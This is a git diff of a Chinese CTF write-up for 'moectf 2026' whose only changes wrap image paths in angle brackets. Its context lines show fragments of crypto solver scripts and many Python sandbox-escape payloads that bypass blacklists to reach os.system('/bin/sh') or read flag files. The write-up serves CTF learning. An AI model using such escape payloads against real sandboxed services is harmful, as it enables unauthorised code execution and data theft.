@@ -8944,7 +8944,7 @@ if __name__ == "__main__":
     print(new)
 ```
 
-![image-20260830182407555](./media/moectf 2026/image-20260830182407555.png)
+![image-20260830182407555](<./media/moectf 2026/image-20260830182407555.png>)
 
 ### moePoly2
 
@@ -9005,7 +9005,7 @@ for cand in possible:
         break
 ```
 
-![image-20260830211611467](./media/moectf 2026/image-20260830211611467.png)
+![image-20260830211611467](<./media/moectf 2026/image-20260830211611467.png>)
 
 ### ez_lattice
 
@@ -9069,7 +9069,7 @@ print("secret =", secret)
 print("Flag = moectf{" + secret.decode() + "}")
 ```
 
-![image-20260830231243249](./media/moectf 2026/image-20260830231243249.png)
+![image-20260830231243249](<./media/moectf 2026/image-20260830231243249.png>)
 
 ### m1x3d_d1p
 
@@ -9090,7 +9090,7 @@ print(h)
 print(h * G == Q)   # 验证
 ```
 
-![image-20260831124808684](./media/moectf 2026/image-20260831124808684.png)
+![image-20260831124808684](<./media/moectf 2026/image-20260831124808684.png>)
 
 然后加密端取了一个256比特的强素数满足$p_1 = 2q+1$后计算$h \equiv 4^x \pmod{p_1}$，其中$x\in[2^{72}, 2^{72}+2^{50})$，我们由此可以先求解x：
 
@@ -9124,7 +9124,7 @@ for j in range(m):
     cur = (cur * inv_factor) % p1
 ```
 
-![image-20260831124959433](./media/moectf 2026/image-20260831124959433.png)
+![image-20260831124959433](<./media/moectf 2026/image-20260831124959433.png>)
 
 接着加密端取了两个1024-bit素数$p_2,q_2$并令$n=p_2q_2$，把 16 字节 salt 看作整数$m=\text{bytes\_to\_int(salt)}（0<m<n）$后计算$c = (n-1)^m \bmod n^3$得到密文
 
@@ -9179,7 +9179,7 @@ flag = bytes(a ^ b for a, b in zip(ct, stream))
 print("FLAG =", flag)
 ```
 
-![image-20260831125905830](./media/moectf 2026/image-20260831125905830.png)
+![image-20260831125905830](<./media/moectf 2026/image-20260831125905830.png>)
 
 ### 西小电银行
 
@@ -9265,9 +9265,9 @@ if __name__ == "__main__":
     main()
 ```
 
-![image-20260831220514150](./media/moectf 2026/image-20260831220514150.png)
+![image-20260831220514150](<./media/moectf 2026/image-20260831220514150.png>)
 
-![image-20260831220448294](./media/moectf 2026/image-20260831220448294.png)
+![image-20260831220448294](<./media/moectf 2026/image-20260831220448294.png>)
 
 ### moeChamp10n
 
@@ -9392,7 +9392,7 @@ if __name__ == "__main__":
     main()
 ```
 
-![image-20260901002456421](./media/moectf 2026/image-20260901002456421.png)
+![image-20260901002456421](<./media/moectf 2026/image-20260901002456421.png>)
 
 ## Python沙箱逃逸
 
@@ -9406,7 +9406,7 @@ getattr(__builtins__,'__imp'+'ort__')('o'+'s').__getattribute__('sys'+'tem')('sh
 
 把黑名单我们都通过拼接绕过，然后我们通过find指令直接查flag：
 
-![image-20260827172419802](./media/moectf 2026/image-20260827172419802.png)
+![image-20260827172419802](<./media/moectf 2026/image-20260827172419802.png>)
 
 ### 3z_ban_jail
 
@@ -9422,7 +9422,7 @@ getattr(__builtins__,'__imp'+'ort__')('o'+'s').__getattribute__('sys'+'tem')('sh
 import os;os.system('/bin/sh')
 ```
 
-![image-20260827202601223](./media/moectf 2026/image-20260827202601223.png)
+![image-20260827202601223](<./media/moectf 2026/image-20260827202601223.png>)
 
 ### Three
 
@@ -9452,7 +9452,7 @@ for r in range(3):
     print(f"{r}:{chars}")
 ```
 
-![image-20260827210415545](./media/moectf 2026/image-20260827210415545.png)
+![image-20260827210415545](<./media/moectf 2026/image-20260827210415545.png>)
 
 我们还是找那种可以输入input命令的触发指令好拿shell，我们写一个暴力破解命令的脚本：
 
@@ -9537,11 +9537,11 @@ else:
 
 这段代码通过穷举带占位符 `?` 的代码模板，将 `?` 自动替换为 `0`、`1`、`2` 来满足校验，并最终通过 `compile` 语法检查，从而生成一个既符合字符级过滤规则、又能正常执行的 Python 代码字符串，运行出来一个符合条件的指令：
 
-![image-20260827220629975](./media/moectf 2026/image-20260827220629975.png)
+![image-20260827220629975](<./media/moectf 2026/image-20260827220629975.png>)
 
 打shell拿flag：
 
-![image-20260827215845497](./media/moectf 2026/image-20260827215845497.png)
+![image-20260827215845497](<./media/moectf 2026/image-20260827215845497.png>)
 
 ### e2_ban_jail
 
@@ -9553,7 +9553,7 @@ exec('exec('+chr(ord('h')+(not()))+'n'+chr(ord('o')+(not()))+'u'+'t'+'())')
 
 然后还是老一套，flag的位置也没有变：
 
-![image-20260828000159971](./media/moectf 2026/image-20260828000159971.png)
+![image-20260828000159971](<./media/moectf 2026/image-20260828000159971.png>)
 
 ### equals
 
@@ -9591,11 +9591,11 @@ payload = make_equal("exec(input())#")
 print(payload)
 ```
 
-![image-20260828112248054](./media/moectf 2026/image-20260828112248054.png)
+![image-20260828112248054](<./media/moectf 2026/image-20260828112248054.png>)
 
 payload就出来了，后面还是老样子：
 
-![image-20260828112420493](./media/moectf 2026/image-20260828112420493.png)
+![image-20260828112420493](<./media/moectf 2026/image-20260828112420493.png>)
 
 ### ez_b4n_jail
 
@@ -9613,7 +9613,7 @@ s="""getattr(__import__("o"+"s"), "sy"+"stem")("cat /tmp/flag")"""
 print(base64.b64encode(s.encode()).decode())
 ```
 
-![image-20260828230848686](./media/moectf 2026/image-20260828230848686.png)
+![image-20260828230848686](<./media/moectf 2026/image-20260828230848686.png>)
 
 ### mathmagic
 
@@ -9807,7 +9807,7 @@ if __name__ == "__main__":
     main()
 ```
 
-![image-20260829104759267](./media/moectf 2026/image-20260829104759267.png)
+![image-20260829104759267](<./media/moectf 2026/image-20260829104759267.png>)
 
 ### CleanHacker
 
@@ -9827,7 +9827,7 @@ s="global globals;from builtins import set as globals"
 print(base64.b64encode(s.encode()).decode())
 ```
 
-![image-20260829142421909](./media/moectf 2026/image-20260829142421909.png)
+![image-20260829142421909](<./media/moectf 2026/image-20260829142421909.png>)
 
 ### Parens? No!
 
@@ -9888,7 +9888,7 @@ class SearchFlag: pass
 
 我们最后从`os_cls.__init__.__globals__`拿到`os`模块字典 `os_globals`。将 `__build_class__` 设为返回字符串 `'system'`，装饰器 `@os_globals.__getitem__` 无括号取出 `os.system`；再令 `__build_class__` 返回命令字符串，装饰器 `@GetSystem` 执行 `os.system(命令)`，执行 `cat` 和 `find` 查找 flag拿上flag：
 
-![image-20260830130348900](./media/moectf 2026/image-20260830130348900.png)
+![image-20260830130348900](<./media/moectf 2026/image-20260830130348900.png>)
 
 ### only_open
 
@@ -9900,7 +9900,7 @@ class SearchFlag: pass
 
 这个payload用flag的内容当键去查空字典后触发异常KeyError，异常信息里会把键的内容直接打印出来于是：
 
-![image-20260830172646286](./media/moectf 2026/image-20260830172646286.png)
+![image-20260830172646286](<./media/moectf 2026/image-20260830172646286.png>)
 
 ### **CatBox**
 
@@ -9938,7 +9938,7 @@ __builtins____import__oscat /tmp/flag
 [cat._＿class＿_[cat.name[24:]]for	cat._＿class＿_._＿class_getitem＿_	in[O.system]]
 ```
 
-![image-20260830215426707](./media/moectf 2026/image-20260830215426707.png)
+![image-20260830215426707](<./media/moectf 2026/image-20260830215426707.png>)
 
 ### Parens? No! Revenge!
 
@@ -9963,7 +9963,7 @@ __builtins__.__build_class__ = lambda body, name: 'cat /flag /flag.txt /root/fla
 class SearchFlag: pass
 ```
 
-![image-20260831155432519](./media/moectf 2026/image-20260831155432519.png)
+![image-20260831155432519](<./media/moectf 2026/image-20260831155432519.png>)
 
 ### Pyjail笑传之CallingComesBack
 
@@ -9997,7 +9997,7 @@ license
 !__import__('os').system('cat /tmp/flag')
 ```
 
-![image-20260831113517456](./media/moectf 2026/image-20260831113517456.png)
+![image-20260831113517456](<./media/moectf 2026/image-20260831113517456.png>)
 
 两步payload我们还可以再压缩，我们可以用`ast.AST`，这个是可改写的：
 
@@ -10006,7 +10006,7 @@ license
 ast.AST['open("/tmp/flag").read()']               
 ```
 
-![image-20260831123348112](./media/moectf 2026/image-20260831123348112.png)
+![image-20260831123348112](<./media/moectf 2026/image-20260831123348112.png>)
 
 这道题除了先前的方法我们还可以在此基础上做优化，我们可以尝试自己造一个可控的触发点来解这道题，鉴于这个思路，我设计了一个两步payload，用 `__class_getitem__`隐式调 `exec` 拿 flag：
 
@@ -10015,7 +10015,7 @@ ast.AST['open("/tmp/flag").read()']
 quit.__class__['print(open("/tmp/flag").read())']             
 ```
 
-![image-20260831122946515](./media/moectf 2026/image-20260831122946515.png)
+![image-20260831122946515](<./media/moectf 2026/image-20260831122946515.png>)
 
 利用该思路我们可以继续优化到单步进pbd:
 
@@ -10023,7 +10023,7 @@ quit.__class__['print(open("/tmp/flag").read())']
  [quit for quit.__class__.__repr__ in[breakpoint]]
 ```
 
-![image-20260831141801369](./media/moectf 2026/image-20260831141801369.png)
+![image-20260831141801369](<./media/moectf 2026/image-20260831141801369.png>)
 
 我们还可以进一步优化使其不依赖print()，我们可以通过利用一元运算在eval阶段通过一元运算触发：
 
@@ -10031,7 +10031,7 @@ quit.__class__['print(open("/tmp/flag").read())']
 [-quit for quit.__class__.__neg__ in[breakpoint]]
 ```
 
-![5692be810e515806fec9b3f7d062db9e](./media/moectf 2026/5692be810e515806fec9b3f7d062db9e.png)
+![5692be810e515806fec9b3f7d062db9e](<./media/moectf 2026/5692be810e515806fec9b3f7d062db9e.png>)
 
 ### 双十一
 
@@ -10051,7 +10051,7 @@ quit.__class__['print(open("/tmp/flag").read())']
 [*vars (vars ()[[*vars()][(([]==[])+([]==[]))*(([]==[])+([]==[])+([]==[]))]])]
 ```
 
-![image-20260901115539655](./media/moectf 2026/image-20260901115539655.png)
+![image-20260901115539655](<./media/moectf 2026/image-20260901115539655.png>)
 
 拿到`exec`的下标 为20，`input` 的下标 为28后我们进`input()`：
 
@@ -10065,7 +10065,7 @@ vars(vars()[[*vars()][((([]==[])+([]==[])))*((([]==[])+([]==[])+([]==[])))]])[[*
 print(open('/tmp/flag.txt').read())
 ```
 
-![image-20260901115806387](./media/moectf 2026/image-20260901115806387.png)
+![image-20260901115806387](<./media/moectf 2026/image-20260901115806387.png>)
 
 ### revenge_jail
 
@@ -10131,4 +10131,4 @@ except Exception as e:
 print(base64.b64encode(s.encode()).decode())
 ```
 
-![image-20260901113443753](./media/moectf 2026/image-20260901113443753.png)
+![image-20260901113443753](<./media/moectf 2026/image-20260901113443753.png>)
